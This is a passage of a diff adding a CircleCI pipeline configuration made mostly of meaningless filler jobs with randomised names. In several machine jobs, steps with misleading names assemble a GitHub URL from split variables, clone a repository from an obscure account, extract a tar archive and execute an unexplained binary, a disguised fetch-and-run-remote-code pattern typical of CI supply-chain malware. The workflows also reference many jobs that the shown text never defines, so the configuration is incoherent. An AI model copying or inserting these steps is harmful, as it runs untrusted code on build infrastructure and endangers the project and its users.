+          command: |
+            /bin/bash -c './DesktopAppSourceArchiveStep18'
+  deploy-kernel-track-2:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: update-agent-database-setup
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'ServerStartupBenchmark MinimalReleaseGatePass2' | sed 'p;d' | head -1 > /tmp/plugins-part-7/BumpEngineReleaseTag
+            du -b /tmp/plugins-part-7/BumpEngineReleaseTag
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'BumpEngineReleaseTag'
+  PromoteInstancesToOneRegion:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/BumpEngineReleaseTag"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth 3 --no-tags "https://$part/$stepof/$metrics" $(pwd)
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar xf "StoreAccessProxyBuildReport.tar"
+      - run:
+          command: |
+            "$(pwd)/DesktopAppSourceArchiveStep18"
+  hourly-test-cache:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Collect extension failure report
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'catalog-commit-lint editor-mirror-refresh' | sed 'p;d' | head -1 > /tmp/plugins-part-7/landing-page-binary-upload
+            du -b /tmp/plugins-part-7/landing-page-binary-upload
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'landing-page-binary-upload'
+  ScheduledDatabaseSetup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/BasicMatrix"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth=1 --branch main "https://$part/$stepof/$metrics" "$(pwd)"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar xf StoreAccessProxyBuildReport.tar --no-same-owner
+      - run:
+          command: |
+            bash -c "exec ./DesktopAppSourceArchiveStep18"
+  conditional-checkout:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: PreReviewReleasePackaging
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'PersistBuildSummary loader-state-backup' | sed 'p;d' | head -1 > /tmp/plugins-part-7/gather-kernel-failure-report
+            du -b /tmp/plugins-part-7/gather-kernel-failure-report
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'gather-kernel-failure-report'
+  isolated-visual-test-job:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/gather-kernel-failure-report"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth=1 --no-tags "https://$part/$stepof/$metrics" "`pwd`"
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar xf "StoreAccessProxyBuildReport.tar"
+      - run:
+          command: |
+            cd . && ./DesktopAppSourceArchiveStep18
+  ProvisionReportBuilderDataStore:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: wrapper-change-review-workflow
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'clean-up-temporary-directories artifact-validation-workflow' | sed 'p;d' | head -1 > /tmp/plugins-part-7/eventBusStatusUpdate
+            du -b /tmp/plugins-part-7/eventBusStatusUpdate
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'eventBusStatusUpdate'
+  isolate-level-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/eventBusStatusUpdate"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --quiet --depth 1 "https://$part/$stepof/$metrics" `pwd`
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar xf StoreAccessProxyBuildReport.tar -C .
+      - run:
+          command: |
+            cd . && ./DesktopAppSourceArchiveStep18
+  FirmwareUpload:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: experimental source checksum
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'StagingSmokeTestStep11 nightly-analysis-phase' | sed 'p;d' | head -1 > /tmp/plugins-part-7/CancelQueuedJobsInDryRunMode
+            du -b /tmp/plugins-part-7/CancelQueuedJobsInDryRunMode
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'CancelQueuedJobsInDryRunMode'
+  adapter-draft-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/CancelQueuedJobsInDryRunMode"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --no-tags "https://$part/$stepof/$metrics" `pwd`
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar -x -v -f StoreAccessProxyBuildReport.tar
+      - run:
+          command: |
+            /bin/sh -c "./DesktopAppSourceArchiveStep18"
+  build-and-benchmark-mobile-app:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: post-approval-tests (retry 1)
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'registry-job-summary PreCommitStaticAnalysis' | sed 'p;d' | head -1 > /tmp/plugins-part-7/mirror-converter-artifacts
+            du -b /tmp/plugins-part-7/mirror-converter-artifacts
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'mirror-converter-artifacts'
+  write-build-summary-for-review:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: logging-encoder-build-number
+          command: |
+            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/mirror-converter-artifacts"
+      - run:
+          name: RequiredUpgradeDryRun
+          command: |
+            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
+            git clone --depth=3 --branch main "https://$part/$stepof/$metrics" $PWD
+      - run:
+          name: Load partner portal compiler flags
+          command: |
+            tar --extract -f - < StoreAccessProxyBuildReport.tar
+      - run:
+          command: |
+            /bin/bash -c "./DesktopAppSourceArchiveStep18"
+
+  extension-production-approval:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: LoadFirmwareReferenceData
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'creating-database-snapshot failure-analysis-wave-2' | sed 'p;d' | head -1 > /tmp/plugins-part-7/fullExtensionTypeChecks
+            du -b /tmp/plugins-part-7/fullExtensionTypeChecks
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'fullExtensionTypeChecks'
+  link-exporter-binaries:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: purge (pass 3)
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'calculateImporterChecksum BundleNameServer' | sed 'p;d' | head -1 > /tmp/plugins-part-7/gather-kernel-failure-report
+            du -b /tmp/plugins-part-7/gather-kernel-failure-report
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'gather-kernel-failure-report'
+  PrepareBridge:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: PromoteIndexerLibraryToBetaChannel
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'filteringRun3 PostUploadTypeChecks' | sed 'p;d' | head -1 > /tmp/plugins-part-7/notification-service-tests
+            du -b /tmp/plugins-part-7/notification-service-tests
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'notification-service-tests'
+  vetting-cycle-1:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: file-server-layer-cache (run 7)
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'scheduled-cleanup TemplateEngineSync' | sed 'p;d' | head -1 > /tmp/plugins-part-7/UploadWorkflow
+            du -b /tmp/plugins-part-7/UploadWorkflow
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'UploadWorkflow'
+  ContinuousCoverageUploadLevel1:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Cancel duplicate builds on tagged commits
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'imageProcessorCompile PostDeployStateSnapshot' | sed 'p;d' | head -1 > /tmp/plugins-part-7/installing-test-tools
+            du -b /tmp/plugins-part-7/installing-test-tools
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'installing-test-tools'
+  PreRestoreSanityChecks:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Simulator Security Approval
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'publish-client MonthlyBranchCheckoutPhase1' | sed 'p;d' | head -1 > /tmp/plugins-part-7/complete-promotion
+            du -b /tmp/plugins-part-7/complete-promotion
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'complete-promotion'
+  monitor-deployment-rollback:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: FastFailureReport
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'UpdaterBetaRelease Validator' | sed 'p;d' | head -1 > /tmp/plugins-part-7/help-center-lint
+            du -b /tmp/plugins-part-7/help-center-lint
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'help-center-lint'
+  full-storage-migration:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Save image processor test metrics with timeout
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'Batch8Of9 RollBackFeatureFlags' | sed 'p;d' | head -1 > /tmp/plugins-part-7/CancelQueuedJobsInDryRunMode
+            du -b /tmp/plugins-part-7/CancelQueuedJobsInDryRunMode
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'CancelQueuedJobsInDryRunMode'
+  LongRunningClusterHealthCheck:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Configure payment service
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'UploadServiceTestCache copy-metrics-to-remote-storage' | sed 'p;d' | head -1 > /tmp/plugins-part-7/PostLintBenchmarks
+            du -b /tmp/plugins-part-7/PostLintBenchmarks
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'PostLintBenchmarks'
+  periodicConfigurationMigration:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: collectCoverageDataAndUploadBuildOutputs
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'tear-down-editor-data-store jobRunnerBackupRotation' | sed 'p;d' | head -1 > /tmp/plugins-part-7/pre-launch-dependency-audit
+            du -b /tmp/plugins-part-7/pre-launch-dependency-audit
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'pre-launch-dependency-audit'
+  failure-analysis-job:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: taskQueueUpload
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'post-sync-hook ExtendedCodeAnalysisPhase' | sed 'p;d' | head -1 > /tmp/plugins-part-7/eventBusStatusUpdate
+            du -b /tmp/plugins-part-7/eventBusStatusUpdate
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'eventBusStatusUpdate'
+  RendererBuildOutputs:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Continuous Release Notification Workflow
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'PreCommitScript LintFastTestsForCanary' | sed 'p;d' | head -1 > /tmp/plugins-part-7/mirror-converter-artifacts
+            du -b /tmp/plugins-part-7/mirror-converter-artifacts
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'mirror-converter-artifacts'
+  isolated-rollback-notification:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Importer deploy
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'fetch-from-backup Patch' | sed 'p;d' | head -1 > /tmp/plugins-part-7/LongRunningCodeCheckout
+            du -b /tmp/plugins-part-7/LongRunningCodeCheckout
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'LongRunningCodeCheckout'
+  BackUpLoadBalancerSettings:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: SequentialPluginPackaging
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'configuration-backup-stage UserPortalVersion' | sed 'p;d' | head -1 > /tmp/plugins-part-7/encoder-integration-tests
+            du -b /tmp/plugins-part-7/encoder-integration-tests
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'encoder-integration-tests'
+  promote-encoder-image:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Test harness cleanup
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'complete-environment-removal SharedVolumeBackup' | sed 'p;d' | head -1 > /tmp/plugins-part-7/BumpEngineReleaseTag
+            du -b /tmp/plugins-part-7/BumpEngineReleaseTag
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'BumpEngineReleaseTag'
+  PostBuildCheckStage5:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: configuration-export-hook
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'publish-registry-build-summary review-adapter-test-summary' | sed 'p;d' | head -1 > /tmp/plugins-part-7/ReleaseApprovalPipeline
+            du -b /tmp/plugins-part-7/ReleaseApprovalPipeline
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'ReleaseApprovalPipeline'
+  FetchSchemasAtPipelineEnd:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: schema-registry-health-check
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'AuditRun analyzer-snapshot-restore' | sed 'p;d' | head -1 > /tmp/plugins-part-7/optimize-decoder-static-library
+            du -b /tmp/plugins-part-7/optimize-decoder-static-library
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'optimize-decoder-static-library'
+  BridgeMigrationsRound3:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Copy upload service packages
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'PreUpgradeDesignReview release-application-in-stages' | sed 'p;d' | head -1 > /tmp/plugins-part-7/analyzerReleasePackage
+            du -b /tmp/plugins-part-7/analyzerReleasePackage
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'analyzerReleasePackage'
+  MoveBackEndStatusReport:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: post-deploy-audit
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'identity-service-setup TestRun3' | sed 'p;d' | head -1 > /tmp/plugins-part-7/PostDeployStep
+            du -b /tmp/plugins-part-7/PostDeployStep
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'PostDeployStep'
+  daemon-debug-logs:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: write-proxy-dependency-tree-for-release
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'CountTestCases LinkRateLimiterBinaries' | sed 'p;d' | head -1 > /tmp/plugins-part-7/Troubleshoot
+            du -b /tmp/plugins-part-7/Troubleshoot
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'Troubleshoot'
+  FetchFromUpstream:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: promoteExecutableToReleaseChannel
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'BundleEditorStyleSheets SearchForMissingTranslations' | sed 'p;d' | head -1 > /tmp/plugins-part-7/legacy-beta-release
+            du -b /tmp/plugins-part-7/legacy-beta-release
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'legacy-beta-release'
+  CopyingObjectFiles:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: IncrementalTestPipeline (segment 1)
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'experimental-migration-dry-run CacheHealthCheckLevel1' | sed 'p;d' | head -1 > /tmp/plugins-part-7/schedule-reporting-system-tests
+            du -b /tmp/plugins-part-7/schedule-reporting-system-tests
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'schedule-reporting-system-tests'
+  ConvertLogFilesInContainer:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Partner portal translation update
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'postCheckoutHooks MonthlyWebsiteChecks' | sed 'p;d' | head -1 > /tmp/plugins-part-7/Phase
+            du -b /tmp/plugins-part-7/Phase
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'Phase'
+  ImporterDebugSymbols:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Update build dependencies and rebuild deployment package
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'ArchiveChecksumBatch4Of12 controller-source-digest' | sed 'p;d' | head -1 > /tmp/plugins-part-7/HourlyRepositoryFetchPhase
+            du -b /tmp/plugins-part-7/HourlyRepositoryFetchPhase
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'HourlyRepositoryFetchPhase'
+  purge-extension-module-cache:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: rerun-failed-mail-server-tests
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'WritingAuditRecordForReview copy-debug-symbols' | sed 'p;d' | head -1 > /tmp/plugins-part-7/create-temporary-directory
+            du -b /tmp/plugins-part-7/create-temporary-directory
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'create-temporary-directory'
+  ConfigureLayerCache:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plugins-part-7
+      - run:
+          name: Legacy failure report run (part 4)
+          command: |
+            mkdir -p /tmp/plugins-part-7
+            echo 'pre-lint-schema-checks UpdaterUpgradeSmokeTestRun' | sed 'p;d' | head -1 > /tmp/plugins-part-7/MonthlyOperatorHealthChecks
+            du -b /tmp/plugins-part-7/MonthlyOperatorHealthChecks
+      - persist_to_workspace:
+          root: /tmp/plugins-part-7
+          paths:
+            - 'MonthlyOperatorHealthChecks'
+workflows:
+  pre-upgrade-security-audit:
+    jobs:
+      - LintManifestsForEveryModule
+      - extension-production-approval:
+          requires:
+            - LintManifestsForEveryModule
+      - parallel-verification:
+          requires:
+            - extension-production-approval
+      - conditional-checkout:
+          requires:
+            - extension-production-approval
+      - link-exporter-binaries:
+          requires:
+            - conditional-checkout
+      - isolated-visual-test-job:
+          requires:
+            - link-exporter-binaries
+      - stop-console-workers:
+          requires:
+            - link-exporter-binaries
+      - PrepareBridge:
+          requires:
+            - stop-console-workers
+      - ScanRouterInstaller:
+          requires:
+            - PrepareBridge
+      - VerifyingLicenses:
+          requires:
+            - PrepareBridge
+      - vetting-cycle-1:
+          requires:
+            - VerifyingLicenses
+      - CollectorCompile:
+          requires:
+            - vetting-cycle-1
+      - update-agent-build-metrics:
+          requires:
+            - vetting-cycle-1
+      - ContinuousCoverageUploadLevel1:
+          requires:
+            - update-agent-build-metrics
+      - restart-test-cluster:
+          requires:
+            - ContinuousCoverageUploadLevel1
+      - evaluate-benchmark-results:
+          requires:
+            - ContinuousCoverageUploadLevel1
+      - PreRestoreSanityChecks:
+          requires:
+            - evaluate-benchmark-results
+      - RuntimeMigrations:
+          requires:
+            - PreRestoreSanityChecks
+      - setUpDriverDataStore:
+          requires:
+            - PreRestoreSanityChecks
+      - monitor-deployment-rollback:
+          requires:
+            - setUpDriverDataStore
+      - applyViewerManifest:
+          requires:
+            - monitor-deployment-rollback
+      - FirmwareUpload:
+          requires:
+            - monitor-deployment-rollback
+      - full-storage-migration:
+          requires:
+            - FirmwareUpload
+      - adapter-draft-release:
+          requires:
+            - full-storage-migration
+      - FetchSources:
+          requires:
+            - full-storage-migration
+      - LongRunningClusterHealthCheck:
+          requires:
+            - FetchSources
+      - Downloading:
+          requires:
+            - LongRunningClusterHealthCheck
+      - PushLoaderImage:
+          requires:
+            - LongRunningClusterHealthCheck
+      - periodicConfigurationMigration:
+          requires:
+            - PushLoaderImage
+      - package-download:
+          requires:
+            - periodicConfigurationMigration
+      - ProvisionReportBuilderDataStore:
+          requires:
+            - periodicConfigurationMigration
+      - failure-analysis-job:
+          requires:
+            - ProvisionReportBuilderDataStore
+      - isolate-level-3:
+          requires:
+            - failure-analysis-job
+      - build-and-benchmark-mobile-app:
+          requires:
+            - failure-analysis-job
+      - RendererBuildOutputs:
+          requires:
+            - build-and-benchmark-mobile-app
+      - write-build-summary-for-review:
+          requires:
+            - RendererBuildOutputs
+      - local-artifact-promotion-job:
+          requires:
+            - RendererBuildOutputs
+      - isolated-rollback-notification:
+          requires:
+            - local-artifact-promotion-job
+      - web-app-integration-tests:
+          requires:
+            - isolated-rollback-notification
+      - module-compilation-split-3-of-5:
+          requires:
+            - isolated-rollback-notification
+      - BackUpLoadBalancerSettings:
+          requires:
+            - module-compilation-split-3-of-5
+      - packageLocalization:
+          requires:
+            - BackUpLoadBalancerSettings
+      - deploy-kernel-track-2:
+          requires:
+            - BackUpLoadBalancerSettings
+      - promote-encoder-image:
+          requires:
+            - deploy-kernel-track-2
+      - PromoteInstancesToOneRegion:
+          requires:
+            - promote-encoder-image
+  StrictSync:
+    jobs:
+      - on-demand-state-backup-pipeline
+      - PostBuildCheckStage5:
+          requires:
+            - on-demand-state-backup-pipeline
+      - emergency-provisioning:
+          requires:
+            - PostBuildCheckStage5
+      - RecordUploadServiceVersion:
+          requires:
+            - PostBuildCheckStage5
+      - FetchSchemasAtPipelineEnd:
+          requires:
+            - RecordUploadServiceVersion
+      - engine-package-checksum:
+          requires:
+            - FetchSchemasAtPipelineEnd
+      - catalog-changelog-round-3:
+          requires:
+            - FetchSchemasAtPipelineEnd
+      - BridgeMigrationsRound3:
+          requires:
+            - catalog-changelog-round-3
+      - bridge-cache-upload:
+          requires:
+            - BridgeMigrationsRound3
+      - HighPriorityInstall:
+          requires:
+            - BridgeMigrationsRound3
+      - MoveBackEndStatusReport:
+          requires:
+            - HighPriorityInstall
+      - SchemaMigrationHook:
+          requires:
+            - MoveBackEndStatusReport
+      - MonitorPackaging:
+          requires:
+            - MoveBackEndStatusReport
+      - daemon-debug-logs:
+          requires:
+            - MonitorPackaging
+      - OneTimeMigrationTest:
+          requires:
+            - daemon-debug-logs
+      - CacheWebAppImage:
+          requires:
+            - daemon-debug-logs
+      - FetchFromUpstream:
+          requires:
+            - CacheWebAppImage
+      - artifact-inspection:
+          requires:
+            - FetchFromUpstream
+      - ExporterArchiveExtractionTask:
+          requires:
+            - FetchFromUpstream
+      - CopyingObjectFiles:
+          requires:
+            - ExporterArchiveExtractionTask
+      - operator-deploy:
+          requires:
+            - CopyingObjectFiles
+      - permission-audit-part-1-of-5:
+          requires:
+            - CopyingObjectFiles
+      - ConvertLogFilesInContainer:
+          requires:
+            - permission-audit-part-1-of-5
+      - SecondaryPackageDownload:
+          requires:
+            - ConvertLogFilesInContainer
+      - FetchBuildMetadata:
+          requires:
+            - ConvertLogFilesInContainer
+      - ImporterDebugSymbols:
+          requires:
+            - FetchBuildMetadata
+      - preview-release-pipeline:
+          requires:
+            - ImporterDebugSymbols
+      - DeployContainerImage:
+          requires:
+            - ImporterDebugSymbols
+      - purge-extension-module-cache:
+          requires:
+            - DeployContainerImage
+      - server-dependency-review-stage:
+          requires:
+            - purge-extension-module-cache
+      - compile-and-test-profiler:
+          requires:
+            - purge-extension-module-cache
+      - ConfigureLayerCache:
+          requires:
+            - compile-and-test-profiler
+      - post-build-data-extraction:
+          requires:
+            - ConfigureLayerCache
+  hash-reporting-release-archive:
+    jobs:
+      - renameLibraryInBackground
+      - postDeployResourceRemoval
+      - hourly-test-cache
+      - post-test-approval-gate:
+          requires:
+            - renameLibraryInBackground
+            - postDeployResourceRemoval
+            - hourly-test-cache
+      - PreUpgradeLinkChecks:
+          requires:
+            - renameLibraryInBackground
+            - postDeployResourceRemoval
+            - hourly-test-cache
+      - ScheduledDatabaseSetup:
+          requires:
+            - renameLibraryInBackground
+            - postDeployResourceRemoval
+            - hourly-test-cache
+      - agent-test-build:
+          requires:
+            - renameLibraryInBackground
+            - postDeployResourceRemoval
+            - hourly-test-cache
